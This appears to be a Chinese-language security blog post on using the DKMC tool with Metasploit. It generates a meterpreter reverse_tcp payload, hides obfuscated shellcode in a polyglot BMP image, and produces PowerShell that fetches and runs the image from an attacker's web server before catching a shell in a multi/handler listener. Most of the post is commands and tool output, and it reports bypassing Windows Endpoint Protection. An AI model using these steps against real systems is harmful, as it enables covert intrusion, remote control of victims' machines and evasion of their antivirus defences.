---
title: DKMC-MSF
comments: false
typora-root-url: ..
typora-copy-images-to: ../images
date: 2018-06-19 15:58:20
tags:
- MSF
- DKMC
categories:
- 内网安全
permalink:
---
<blockquote class="blockquote-center">黑夜无论怎样悠长,<br>白昼总会到来</blockquote>

> DKMC 是一个生成混杂的shellcode且存储在polyglot图像的工具，具体内容可以参考[DKMC presentation 2017](https://github.com/Mr-Un1k0d3r/DKMC/blob/master/DKMC%20presentation%202017.pdf)。

### 安装DKMC

```
git clone https://github.com/Mr-Un1k0d3r/DKMC.git
cd DKMC
mkdir output
```

![image-20180619161008984](/images/image-20180619161008984.png)

### 配合MSF使用

基本流程：

* 生成shellcode （meterpreter、Beacon）
* 在图片中嵌入混淆的shellcode
* powershell 下载图片，并以powershell执行该图片
* getshell

1. 生成以raw格式的meterpreter

   ```
   msfvenom --platform Windows -a x86 -p windows/meterpreter/reverse_tcp lhost=x.x.x.x lport=x -f raw > test
   ```
   ![image-20180619165318515](/images/image-20180619165318515.png)	

2. 使用sc

  把meterpreter生成shellcode
  ```
  >>> sc
  (shellcode)>>> set source /Users/ff0c/temp/test
  (shellcode)>>> run
  # 复制生成的shellcode，返回主菜单，进入gen
  ```

3. 使用gen

  把生成混淆后的shellcode，嵌入到图片中

  ```
  >>> gen
  (generate)>>> set source sample/haha.bmp  # 图片可以自己更换
  [+] source value is set.
  
  generate)>>> set output output/1.bmp	  # 可以默认
  [+] output value is set.
  
  (generate)>>> set shellcode 粘贴之前生成的shellcode
  # 这里mac下不能粘贴所完整的shellcode，原因不明，在centos下没问题。
  ```
  ![image-20180619173036218](/images/image-20180619173036218.png)

4. 使用ps

  将bmp的图片地址，转换成powershell代码

  ```
  >>> ps
  (powershell)>>> set url http://x.x.x.x:8080/1.bmp
  [+] url value is set.
  
  (powershell)>>> run
  [+] Powershell script:
  # 复制生成的powershell代码，保存为bat或者ps1即可
  ```

  ![image-20180619174017338](/images/image-20180619174017338.png)

5. 使用web

  ```
  >>> web
  (web)>>> set port 8080
  	[+] port value is set.
  
  (web)>>> run
  	[+] Starting web server on port 8080
  ```

  ![image-20180619174624847](/images/image-20180619174624847.png)

6. 开启msf监听

   ```
   msf5 > use exploit/multi/handler
   msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
   # 设置好主机端口，开启后台监听
   msf5 exploit(multi/handler) > exploit -j
   # 在被控主机上使用前面保存的bat脚本，执行。发现可以绕过windows server 自带的Endpoint Protection杀毒软件。
   ```

   ![image-20180620104519742](/images/image-20180620104519742.png)

   ![image-20180620104732496](/images/image-20180620104732496.png)

   ![image-20180620110524554](/images/image-20180620110524554.png)

   ![image-20180620110701921](/images/image-20180620110701921.png)

